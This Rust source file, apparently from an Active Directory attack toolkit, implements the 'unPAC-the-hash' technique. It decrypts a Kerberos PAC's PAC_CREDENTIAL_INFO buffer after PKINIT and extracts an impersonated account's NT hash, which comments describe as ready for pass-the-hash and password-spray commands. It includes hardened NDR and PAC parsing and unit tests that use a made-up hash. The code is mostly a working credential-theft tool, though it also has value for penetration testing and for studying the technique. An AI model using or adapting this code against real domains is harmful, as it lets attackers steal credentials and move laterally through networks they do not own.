//! **1.4.8-A WS-UNPAC-PKINIT** — unPAC-the-hash: extract the NT hash of an
//! impersonated principal out of a PAC's `PAC_CREDENTIAL_INFO` (ulType=2) buffer.
//!
//! The attack chain:
//! 1. PKINIT with a cert (from ESC1 exploit / Shadow Credentials) → TGT +
//!    AS-REP session key (both handed back by
//!    [`crate::pkinit::pkinit_with_cert`]).
//! 2. S4U2Self-to-self with that TGT ([`crate::rbcd_impersonate`] style) →
//!    service ticket whose enc-part is encrypted with our own session key.
//! 3. Decrypt the service-ticket enc-part → get the `EncTicketPart` +
//!    authorization-data → find the AD-WIN2K-PAC → parse it →
//!    locate the ulType=2 `PAC_CREDENTIAL_INFO` buffer.
//! 4. `PAC_CREDENTIAL_INFO` bytes = `Version(4) || EncryptionType(4) ||
//!    SerializedData(N)`. `SerializedData` is encrypted with the AS-REP
//!    session key at **key usage 16** (`KERB_NON_KERB_SALT`, MS-PAC §2.6.4).
//! 5. Decrypt → `PAC_CREDENTIAL_DATA` bytes.
//! 6. NDR-parse `PAC_CREDENTIAL_DATA` → find the `NTLM` supplemental
//!    credential → its payload is `NTLM_SUPPLEMENTAL_CREDENTIAL_V0` with
//!    `Version(4) || Flags(4) || LmPassword[16] || NtPassword[16]`.
//! 7. Return the NT hash (16 bytes) — pass-the-hash-ready. LM hash is
//!    typically zeroed on modern DCs; surfaced when present for completeness.
//!
//! Wire references: MS-PAC §2.6.1 (`PAC_CREDENTIAL_INFO`), §2.6.2
//! (`PAC_CREDENTIAL_DATA`), §2.6.3 (`SECPKG_SUPPLEMENTAL_CRED`), §2.6.4
//! (`NTLM_SUPPLEMENTAL_CREDENTIAL`).

use anyhow::{anyhow, bail, Context, Result};
use picky_krb::crypto::CipherSuite;

// tracing macros are used only in try_unpac_from_encrypted_pa_data — this
// suppresses unused-import lints when that fn is compiled out of a downstream
// consumer's build.
#[allow(unused_imports)]
use tracing;

/// PAC buffer ulType for `PAC_CREDENTIAL_INFO` per MS-PAC §2.4.
pub const PAC_CREDENTIAL_INFO: u32 = 2;

/// Kerberos key usage 16 = `KERB_NON_KERB_SALT` (MS-PAC §2.6.4 mandates it for
/// `PAC_CREDENTIAL_INFO.SerializedData` decryption).
pub const KEY_USAGE_KERB_NON_KERB_SALT: i32 = 16;

/// Extracted credentials from a decrypted `PAC_CREDENTIAL_INFO`. `nt_hash` is
/// always populated on a successful extraction (the reason we ran this attack).
/// `lm_hash` is typically all-zero on modern DCs — surfaced when non-zero for
/// completeness, `None` when the flags bit says LM not present.
///
/// **1.4.8 audit fix:** `Debug` is manually implemented (not derived) so
/// `tracing::debug!("{creds:?}")` — or any bug report the user might paste —
/// prints `nt_hash=*** lm_hash=***` instead of the raw hex. Access the raw
/// bytes with [`Self::nt_hash_bytes`] / [`Self::lm_hash_bytes`], both
/// greppable at every call site for audit. Same discipline as
/// `adhammer_core::Redacted<T>`.
#[derive(Clone)]
pub struct UnpacCreds {
    nt_hash: [u8; 16],
    lm_hash: Option<[u8; 16]>,
    /// Package name from the `SECPKG_SUPPLEMENTAL_CRED` header. Almost always
    /// `"NTLM"` — kept for the rare case of Kerberos-plus-other-package.
    pub package: String,
}

impl std::fmt::Debug for UnpacCreds {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("UnpacCreds")
            .field("nt_hash", &"***")
            .field("lm_hash", &self.lm_hash.map(|_| "***"))
            .field("package", &self.package)
            .finish()
    }
}

impl UnpacCreds {
    /// Wrap raw hash bytes. Every call site that constructs one of these is
    /// pushing an actual secret into memory — greppable via `git grep 'UnpacCreds::new'`.
    pub fn new(nt_hash: [u8; 16], lm_hash: Option<[u8; 16]>, package: String) -> Self {
        Self {
            nt_hash,
            lm_hash,
            package,
        }
    }

    /// Deliberate escape hatch — the raw 16-byte NT hash. Every call is
    /// greppable via `git grep '\.nt_hash_bytes('` for audit.
    pub fn nt_hash_bytes(&self) -> &[u8; 16] {
        &self.nt_hash
    }

    /// Deliberate escape hatch — the raw 16-byte LM hash if present. Every
    /// call is greppable via `git grep '\.lm_hash_bytes('` for audit.
    pub fn lm_hash_bytes(&self) -> Option<&[u8; 16]> {
        self.lm_hash.as_ref()
    }

    /// Human-readable hex line of the NT hash. Matches `dcsync` /
    /// `secretsdump` output format so downstream `attack ptt` / `attack spray
    /// --hash` can consume it directly. Deliberate leak — the whole point of
    /// the WS-UNPAC-PKINIT verb is to emit the hash to the operator's stdout.
    pub fn nt_hex(&self) -> String {
        self.nt_hash
            .iter()
            .fold(String::with_capacity(32), |mut s, b| {
                use std::fmt::Write;
                write!(s, "{b:02x}").unwrap();
                s
            })
    }
}

/// Given a PAC's raw bytes + the AS-REP session key, find the ulType=2
/// `PAC_CREDENTIAL_INFO` buffer, decrypt its serialized-data payload with the
/// session key at key usage 16, NDR-parse the resulting
/// `PAC_CREDENTIAL_DATA` and return the NT hash.
///
/// Returns `Ok(None)` when the PAC has no `PAC_CREDENTIAL_INFO` buffer — this
/// is expected on standard AS-REP tickets that were not requested via
/// PKINIT (only PKINIT KDCs include the credential-info buffer).
pub fn unpac_credential_info(pac_bytes: &[u8], session_key: &[u8]) -> Result<Option<UnpacCreds>> {
    // ---- PAC framing per MS-PAC §2.3 ----
    // uint32 cBuffers, uint32 Version, then Version identical repeats a-priori
    // (0x00000000), then cBuffers × PAC_INFO_BUFFER (ulType u32, cbBufferSize
    // u32, Offset u64 pointing to the buffer body).
    if pac_bytes.len() < 8 {
        bail!("PAC too short to hold a header ({} bytes)", pac_bytes.len());
    }
    let c_buffers = u32::from_le_bytes(pac_bytes[0..4].try_into().unwrap()) as usize;
    let _version = u32::from_le_bytes(pac_bytes[4..8].try_into().unwrap());
    // 1.4.9 WS-FUZZ-6 finding — c_buffers is attacker-controlled (u32) and
    // `c_buffers * 16` can overflow usize on 32-bit or wrap on 64-bit. Use
    // checked arithmetic so a hostile PAC can't pass the bounds check via
    // overflow.
    let header_len = c_buffers
        .checked_mul(16)
        .and_then(|n| n.checked_add(8))
        .ok_or_else(|| anyhow!("PAC header c_buffers*16+8 overflow (c_buffers={c_buffers})"))?;
    if pac_bytes.len() < header_len {
        bail!(
            "PAC header claims {} buffers but only {} bytes available",
            c_buffers,
            pac_bytes.len()
        );
    }

    // Find the PAC_CREDENTIAL_INFO buffer descriptor.
    for i in 0..c_buffers {
        let d = 8 + i * 16;
        let ul_type = u32::from_le_bytes(pac_bytes[d..d + 4].try_into().unwrap());
        if ul_type != PAC_CREDENTIAL_INFO {
            continue;
        }
        let cb = u32::from_le_bytes(pac_bytes[d + 4..d + 8].try_into().unwrap()) as usize;
        let off = u64::from_le_bytes(pac_bytes[d + 8..d + 16].try_into().unwrap()) as usize;
        // 1.4.9 WS-FUZZ-6 — CVE-class integer-overflow bug found by
        // `pac_credential_info` fuzz target on its first CI run. Hostile KDC
        // could set Offset near usize::MAX and cbBufferSize small; the
        // pre-fix `off + cb > len` check wrapped and then the slice index
        // below panicked. Now checked_add before comparison.
        let end = off.checked_add(cb).ok_or_else(|| {
            anyhow!("PAC_CREDENTIAL_INFO offset+size overflow (off={off}, cb={cb})")
        })?;
        if end > pac_bytes.len() {
            bail!(
                "PAC_CREDENTIAL_INFO buffer descriptor points past PAC end ({}+{} > {})",
                off,
                cb,
                pac_bytes.len()
            );
        }
        let body = &pac_bytes[off..end];
        return Ok(Some(decrypt_and_parse_credential_info(body, session_key)?));
    }
    Ok(None)
}

/// Decrypt a `PAC_CREDENTIAL_INFO` body + parse the resulting
/// `PAC_CREDENTIAL_DATA`. Exposed for callers that already have the body
/// bytes (e.g. from a `ParsedPac` walk in ms-pac-forge).
///
/// Body layout per MS-PAC §2.6.1:
///   `Version(4 LE) || EncryptionType(4 LE) || SerializedData(cb-8)`
pub fn decrypt_and_parse_credential_info(body: &[u8], session_key: &[u8]) -> Result<UnpacCreds> {
    if body.len() < 8 {
        bail!(
            "PAC_CREDENTIAL_INFO body too short ({} bytes, need ≥ 8 for header)",
            body.len()
        );
    }
    let version = u32::from_le_bytes(body[0..4].try_into().unwrap());
    let etype = u32::from_le_bytes(body[4..8].try_into().unwrap());
    let ct = &body[8..];
    // MS-PAC §2.6.1: Version=0 for the AES256-CTS-HMAC-SHA1 encoding; other
    // values are reserved. RC4-HMAC is signalled by etype==23 (RFC 4757).
    if version != 0 {
        bail!("PAC_CREDENTIAL_INFO Version {version} unrecognised — MS-PAC §2.6.1 defines only 0");
    }
    // Decrypt with the session key at key usage 16.
    let plain = decrypt_serialized(etype, session_key, ct)
        .context("decrypt PAC_CREDENTIAL_INFO.SerializedData (usage 16)")?;
    parse_pac_credential_data(&plain)
}

/// Etype-dispatched decrypt of the encrypted `SerializedData`. AES256-CTS is
/// the modern default (etype 18); AES128 (17) and RC4-HMAC (23) are the two
/// legacy fallbacks a KDC might still emit for accounts with only those keys.
///
/// **1.4.9 WS-FUZZ-6 finding.** picky-krb's AES-CTS-HMAC-SHA1 decrypt
/// panics via generic-array 0.14 when handed a ciphertext shorter than
/// `confounder(16) + HMAC(12) = 28` bytes — the internal `GenericArray`
/// slice conversion fails on the truncated input. Every etype gets a
/// hard length lower-bound BEFORE the picky-krb call so a hostile KDC
/// sending a 27-byte SerializedData surfaces as a clean anyhow error
/// instead of a panic exit.
///
/// The bounds:
///   - AES-256-CTS-HMAC-SHA1-96: confounder(16) + HMAC(12) = 28
///   - AES-128-CTS-HMAC-SHA1-96: confounder(16) + HMAC(12) = 28
///   - RC4-HMAC (etype 23): confounder(8) + HMAC(16) = 24 (RFC 4757 §4)
fn decrypt_serialized(etype: u32, key: &[u8], ct: &[u8]) -> Result<Vec<u8>> {
    // 1.4.9 WS-FUZZ-6 finding — picky-krb 0.9.6 has a second-order panic
    // surface inside its GenericArray-based slice conversions: some
    // truncated-but-length-check-passing ciphertext shapes reach a
    // `GenericArray::from_slice` with wrong `N`, which asserts and panics.
    // Length-lower-bounding before the call catches the obvious cases;
    // wrapping the call in `catch_unwind` catches the residual class
    // without waiting on an upstream picky-krb patch. Converted panic
    // surfaces as a clean anyhow error; the operator's session survives.
    fn guarded<F>(label: &'static str, f: F) -> Result<Vec<u8>>
    where
        F: FnOnce() -> Result<Vec<u8>> + std::panic::UnwindSafe,
    {
        std::panic::catch_unwind(f).map_err(|_| {
            anyhow!("{label} panicked on malformed input (picky-krb 0.9.6 upstream)")
        })?
    }

    // Copy the byte-slice inputs into owned Vec<u8> so the closure is
    // UnwindSafe (borrowing from outside would fail the auto-trait check).
    let key_owned = key.to_vec();
    let ct_owned = ct.to_vec();
    let key_ref: &[u8] = &key_owned;
    let ct_ref: &[u8] = &ct_owned;

    // AES-CTS length bounds (BUG-18 root cause). AES-CTS-HMAC-SHA1-96
    // permits exactly two ct shapes without triggering picky-krb 0.9.6's
    // internal GenericArray asserts:
    //   * 28 bytes — empty plaintext, single-block confounder + 12 HMAC
    //   * >= 44 bytes — CTS needs at least two blocks (confounder + one
    //                    plaintext block) + 12 HMAC
    // Anything in [29..44) is a shape picky-krb can't handle without
    // panicking inside `GenericArray::from_slice`. In practice no real KDC
    // ever emits either 28 (empty payload — useless) or the [29..44)
    // window (impossible plaintext length), so we simply require >= 44
    // and route the "empty payload" case to a clean error rather than the
    // decrypt path. `catch_unwind` above is kept as belt-and-suspenders
    // for third-party panics we can't length-predict, but cargo-fuzz
    // builds with `-C panic=abort` so it cannot catch under fuzzing; the
    // length lower bound is the real defence.
    const AES_MIN: usize = 44;
    const RC4_MIN: usize = 40; // 8-byte confounder + block + 16 HMAC, RFC 4757

    match etype {
        18 => {
            if ct.len() < AES_MIN {
                bail!(
                    "PAC_CREDENTIAL_INFO AES256 ciphertext too short ({} bytes, need >= {AES_MIN} for CTS 2-block confounder+plaintext + HMAC)",
                    ct.len()
                );
            }
            guarded("AES256 decrypt", move || {
                CipherSuite::Aes256CtsHmacSha196
                    .cipher()
                    .decrypt(key_ref, KEY_USAGE_KERB_NON_KERB_SALT, ct_ref)
                    .map_err(|e| anyhow!("AES256 decrypt: {e}"))
            })
        }
        17 => {
            if ct.len() < AES_MIN {
                bail!(
                    "PAC_CREDENTIAL_INFO AES128 ciphertext too short ({} bytes, need >= {AES_MIN} for CTS 2-block confounder+plaintext + HMAC)",
                    ct.len()
                );
            }
            guarded("AES128 decrypt", move || {
                CipherSuite::Aes128CtsHmacSha196
                    .cipher()
                    .decrypt(key_ref, KEY_USAGE_KERB_NON_KERB_SALT, ct_ref)
                    .map_err(|e| anyhow!("AES128 decrypt: {e}"))
            })
        }
        23 => {
            if ct.len() < RC4_MIN {
                bail!(
                    "PAC_CREDENTIAL_INFO RC4-HMAC ciphertext too short ({} bytes, need >= {RC4_MIN} for confounder + block + HMAC per RFC 4757)",
                    ct.len()
                );
            }
            guarded("RC4-HMAC decrypt", move || {
                crate::rc4::decrypt(key_ref, KEY_USAGE_KERB_NON_KERB_SALT, ct_ref)
                    .map_err(|e| anyhow!("RC4-HMAC decrypt: {e}"))
            })
        }
        other => bail!("unsupported PAC_CREDENTIAL_INFO etype {other} — expected 17/18/23"),
    }
}

/// Parse a decrypted `PAC_CREDENTIAL_DATA` blob and locate the `"NTLM"`
/// `SECPKG_SUPPLEMENTAL_CRED` payload → extract `NTLM_SUPPLEMENTAL_CREDENTIAL`
/// → return the NT hash (and LM if present).
///
/// The struct is NDR-encoded per MS-PAC §2.6.2 but its shape is fixed so we
/// walk it directly (no full NDR parser needed).
fn parse_pac_credential_data(plain: &[u8]) -> Result<UnpacCreds> {
    // NDR type-marshaling stream header per MS-RPCE §2.2.6.1:
    //   struct { u8 Version, u8 Endianness, u16 CommonHeaderLength, u32 Filler,
    //            u64 Filler2 (reserved) }
    // = 16 bytes of format header, then the payload.
    if plain.len() < 24 {
        bail!(
            "PAC_CREDENTIAL_DATA plaintext too short ({} bytes, need ≥ 24 for NDR headers)",
            plain.len()
        );
    }
    // Skip the RPC common header (8) + type header (8) = first 16 bytes.
    // The next 4 bytes are the outer pointer referent id (nonzero unique ptr).
    // Then u32 CredentialCount = number of SECPKG_SUPPLEMENTAL_CRED entries.
    let after_common = &plain[16..];
    if after_common.len() < 8 {
        bail!("PAC_CREDENTIAL_DATA missing outer pointer + count");
    }
    let _referent = u32::from_le_bytes(after_common[0..4].try_into().unwrap());
    let credential_count = u32::from_le_bytes(after_common[4..8].try_into().unwrap()) as usize;
    if credential_count == 0 {
        bail!("PAC_CREDENTIAL_DATA claims zero SECPKG_SUPPLEMENTAL_CRED entries");
    }
    // For simplicity we handle the common case: one credential (NTLM). More
    // than one is legal but rare — we surface it with an error naming the
    // shape so a caller can extend if we ever see it in the wild.
    if credential_count > 1 {
        bail!(
            "PAC_CREDENTIAL_DATA carries {credential_count} SECPKG_SUPPLEMENTAL_CRED entries — \
             only 1 currently supported; extend parse_pac_credential_data() to iterate"
        );
    }
    // Following 8 bytes: NDR "max count" of the conformant array (== credential_count).
    let mut cursor = &after_common[8..];
    if cursor.len() < 4 {
        bail!("PAC_CREDENTIAL_DATA truncated at conformant-array max count");
    }
    cursor = &cursor[4..];
    // RPC_UNICODE_STRING header (length_u16, max_length_u16, buffer_ptr_u32) — 8 bytes.
    if cursor.len() < 8 {
        bail!("PAC_CREDENTIAL_DATA truncated at PackageName header");
    }
    let pkg_length = u16::from_le_bytes(cursor[0..2].try_into().unwrap()) as usize;
    let _pkg_max = u16::from_le_bytes(cursor[2..4].try_into().unwrap());
    let _pkg_ref = u32::from_le_bytes(cursor[4..8].try_into().unwrap());
    cursor = &cursor[8..];
    // Then a u32 CredentialSize + u32 credentials_ptr referent id.
    if cursor.len() < 8 {
        bail!("PAC_CREDENTIAL_DATA truncated at CredentialSize + ptr");
    }
    let cred_size = u32::from_le_bytes(cursor[0..4].try_into().unwrap()) as usize;
    let _cred_ptr = u32::from_le_bytes(cursor[4..8].try_into().unwrap());
    cursor = &cursor[8..];
    // Deferred content of PackageName: max_count(u32), offset(u32), actual_count(u32) then UTF-16LE bytes padded to 4.
    if cursor.len() < 12 {
        bail!("PAC_CREDENTIAL_DATA truncated at deferred PackageName content");
    }
    let pkg_max_count = u32::from_le_bytes(cursor[0..4].try_into().unwrap()) as usize;
    let _pkg_offset = u32::from_le_bytes(cursor[4..8].try_into().unwrap());
    let pkg_actual = u32::from_le_bytes(cursor[8..12].try_into().unwrap()) as usize;
    cursor = &cursor[12..];
    // PackageName UTF-16 bytes (actual chars).
    let pkg_bytes_len = pkg_actual * 2;
    if cursor.len() < pkg_bytes_len {
        bail!(
            "PAC_CREDENTIAL_DATA truncated in PackageName body (need {pkg_bytes_len}, have {})",
            cursor.len()
        );
    }
    // `as_chunks` requires Rust 1.88; the workspace MSRV is Rust 1.87.
    #[allow(unknown_lints, clippy::chunks_exact_to_as_chunks)]
    let pkg_utf16: Vec<u16> = cursor[..pkg_bytes_len]
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    let package = String::from_utf16(&pkg_utf16).unwrap_or_else(|_| "?".to_string());
    cursor = &cursor[pkg_bytes_len..];
    // Pad to 4-byte alignment after the wide string.
    let after_pkg_offset = pkg_bytes_len; // relative to cursor start above
    let pad = (4 - after_pkg_offset % 4) % 4;
    if cursor.len() < pad {
        bail!("PAC_CREDENTIAL_DATA truncated at PackageName trailing pad");
    }
    cursor = &cursor[pad..];
    // Sanity: pkg_length (byte-length) should equal pkg_actual*2.
    if pkg_length != pkg_bytes_len {
        // Not a hard fail — some producers set length differently, but log it.
        tracing::debug!(
            pkg_length,
            pkg_bytes_len,
            pkg_max_count,
            "PackageName length/actual mismatch — parsing tolerantly"
        );
    }
    // Deferred content of Credentials: max_count(u32) then cred_size bytes.
    if cursor.len() < 4 {
        bail!("PAC_CREDENTIAL_DATA truncated at Credentials max_count");
    }
    let cred_max_count = u32::from_le_bytes(cursor[0..4].try_into().unwrap()) as usize;
    cursor = &cursor[4..];
    if cred_max_count != cred_size {
        bail!(
            "PAC_CREDENTIAL_DATA Credentials max_count {cred_max_count} != CredentialSize {cred_size}"
        );
    }
    if cursor.len() < cred_size {
        bail!(
            "PAC_CREDENTIAL_DATA truncated in Credentials body (need {cred_size}, have {})",
            cursor.len()
        );
    }
    let credentials = &cursor[..cred_size];
    // NTLM_SUPPLEMENTAL_CREDENTIAL_V0 per MS-PAC §2.6.4:
    //   u32 Version | u32 Flags | u8 LmPassword[16] | u8 NtPassword[16]  (total 40)
    if credentials.len() < 40 {
        bail!(
            "NTLM_SUPPLEMENTAL_CREDENTIAL too short ({} bytes, need 40 for V0)",
            credentials.len()
        );
    }
    let ntlm_version = u32::from_le_bytes(credentials[0..4].try_into().unwrap());
    let flags = u32::from_le_bytes(credentials[4..8].try_into().unwrap());
    if ntlm_version != 0 {
        bail!("NTLM_SUPPLEMENTAL_CREDENTIAL Version {ntlm_version} — only V0 supported");
    }
    let lm_present = (flags & 0x0000_0001) != 0;
    let nt_present = (flags & 0x0000_0002) != 0;
    let mut lm_hash = [0u8; 16];
    lm_hash.copy_from_slice(&credentials[8..24]);
    let mut nt_hash = [0u8; 16];
    nt_hash.copy_from_slice(&credentials[24..40]);
    if !nt_present {
        bail!("NTLM_SUPPLEMENTAL_CREDENTIAL Flags bit 1 (NT present) is clear — no NT hash to extract");
    }
    let lm = if lm_present && lm_hash.iter().any(|&b| b != 0) {
        Some(lm_hash)
    } else {
        None
    };
    Ok(UnpacCreds::new(nt_hash, lm, package))
}

/// Walk a PKINIT AS-REP's `encrypted_pa_data` list (see
/// [`crate::pkinit::PkinitTgt::encrypted_pa_data`]) and try each entry as a
/// `PAC_CREDENTIAL_INFO` body. Returns the first entry that decodes cleanly.
///
/// This is the PKINIT-specific unPAC-the-hash path: some KDCs place the
/// `PAC_CREDENTIAL_INFO` bytes directly as a padata entry in the AS-REP's
/// encrypted-pa-data, decryptable with the AS-REP session key (which the
/// PKINIT flow just derived from the DH exchange). Callers whose deployment
/// puts the credential-info inside the ticket's PAC instead should walk the
/// ticket's PAC bytes with [`unpac_credential_info`] directly (after a
/// service-key-decryption step this module doesn't cover).
///
/// Returns `Ok(None)` when no padata entry parses successfully — the honest
/// signal that this particular DC doesn't include the credential info in
/// the AS-REP padata for us. Look at the returned padata types (available on
/// `PkinitTgt::encrypted_pa_data.iter().map(|(t,_)| *t)`) to see what shape
/// the KDC actually returned.
pub fn try_unpac_from_encrypted_pa_data(
    padatas: &[(u32, Vec<u8>)],
    session_key: &[u8],
) -> Result<Option<UnpacCreds>> {
    for (ty, body) in padatas {
        // The credential-info body header is Version(u32-LE=0) + EncryptionType(u32-LE).
        // Reject entries whose first 4 bytes aren't zero — cheap prefilter that avoids
        // running an expensive AES decrypt on padata types we know can't be it.
        if body.len() < 8 || u32::from_le_bytes(body[0..4].try_into().unwrap()) != 0 {
            tracing::trace!(
                padata_type = ty,
                bytes = body.len(),
                "skipping padata (not credential-info shape)"
            );
            continue;
        }
        match decrypt_and_parse_credential_info(body, session_key) {
            Ok(creds) => {
                tracing::debug!(
                    padata_type = ty,
                    package = %creds.package,
                    "PAC_CREDENTIAL_INFO extracted from AS-REP padata"
                );
                return Ok(Some(creds));
            }
            Err(e) => {
                tracing::trace!(
                    padata_type = ty,
                    err = %e,
                    "padata rejected as PAC_CREDENTIAL_INFO"
                );
            }
        }
    }
    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Hand-crafted `PAC_CREDENTIAL_DATA` plaintext (NDR-encoded) matching the
    /// exact shape MS-PAC §2.6.2/§2.6.4 mandates. Verifies our parser walks the
    /// referents, deferred content, alignment padding, and finally extracts the
    /// NT hash from the tail `NTLM_SUPPLEMENTAL_CREDENTIAL_V0`.
    #[test]
    fn parse_hand_crafted_credential_data_extracts_nt_hash() {
        // NDR type-marshaling common + type headers (16 bytes total).
        let mut buf = vec![
            0x01, 0x10, 0x08, 0x00, // Version=1, endian=little, hdr_len=8
            0xcc, 0xcc, 0xcc, 0xcc, // Filler
            0x40, 0x00, 0x00, 0x00, // Object buffer length (unused by us)
            0x00, 0x00, 0x00, 0x00, // Reserved
        ];
        // Outer PAC_CREDENTIAL_DATA pointer referent + credential_count(1).
        buf.extend_from_slice(&0x0002_0000u32.to_le_bytes()); // referent id
        buf.extend_from_slice(&1u32.to_le_bytes()); // credential_count
                                                    // Conformant array max_count.
        buf.extend_from_slice(&1u32.to_le_bytes());
        // SECPKG_SUPPLEMENTAL_CRED[0] header:
        // RPC_UNICODE_STRING PackageName: length_u16=8 (4 UTF-16 chars = "NTLM"),
        // max_length_u16=8, buffer_ptr_u32 = referent.
        buf.extend_from_slice(&8u16.to_le_bytes());
        buf.extend_from_slice(&8u16.to_le_bytes());
        buf.extend_from_slice(&0x0002_0004u32.to_le_bytes());
        // u32 CredentialSize=40, u32 credentials_ptr = referent.
        buf.extend_from_slice(&40u32.to_le_bytes());
        buf.extend_from_slice(&0x0002_0008u32.to_le_bytes());
        // Deferred: PackageName body — max_count=4, offset=0, actual_count=4, then "NTLM" as UTF-16LE.
        buf.extend_from_slice(&4u32.to_le_bytes());
        buf.extend_from_slice(&0u32.to_le_bytes());
        buf.extend_from_slice(&4u32.to_le_bytes());
        for c in "NTLM".encode_utf16() {
            buf.extend_from_slice(&c.to_le_bytes());
        }
        // 4-byte alignment pad after 8-byte "NTLM" body = 0 pad.
        // Deferred: Credentials body — max_count=40, then 40 bytes of NTLM_SUPPLEMENTAL_CREDENTIAL_V0.
        buf.extend_from_slice(&40u32.to_le_bytes());
        // NTLM_SUPPLEMENTAL_CREDENTIAL_V0: Version=0, Flags=0x02 (NT only),
        // LmPassword=zeros(16), NtPassword=known 16 bytes.
        buf.extend_from_slice(&0u32.to_le_bytes()); // Version
        buf.extend_from_slice(&0x0000_0002u32.to_le_bytes()); // Flags: NT present, LM not
        buf.extend_from_slice(&[0u8; 16]); // LmPassword
        let nt_needle: [u8; 16] = [
            0x8a, 0xc4, 0x1d, 0x9e, 0x62, 0xbc, 0xe0, 0x1a, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66,
            0x77, 0x88,
        ];
        buf.extend_from_slice(&nt_needle);

        let creds =
            parse_pac_credential_data(&buf).expect("parse hand-crafted PAC_CREDENTIAL_DATA");
        assert_eq!(creds.nt_hash_bytes(), &nt_needle);
        assert_eq!(
            creds.lm_hash_bytes(),
            None,
            "LM zeros → None (flag says not present)"
        );
        assert_eq!(creds.package, "NTLM");
        assert_eq!(creds.nt_hex(), "8ac41d9e62bce01a1122334455667788");
    }

    /// A PAC that carries no ulType=2 buffer must return `Ok(None)` — the
    /// common case for non-PKINIT tickets.
    #[test]
    fn missing_credential_info_returns_none() {
        // Minimal PAC header: 1 buffer, ulType = PAC_LOGON_INFO (1), zero-length body.
        let mut buf = vec![];
        buf.extend_from_slice(&1u32.to_le_bytes()); // cBuffers
        buf.extend_from_slice(&0u32.to_le_bytes()); // Version
        buf.extend_from_slice(&1u32.to_le_bytes()); // ulType = LOGON_INFO
        buf.extend_from_slice(&0u32.to_le_bytes()); // cbBufferSize
        buf.extend_from_slice(&24u64.to_le_bytes()); // Offset (past header)
        let out = unpac_credential_info(&buf, &[0u8; 32]).expect("no error");
        assert!(out.is_none(), "no PAC_CREDENTIAL_INFO → None");
    }
}
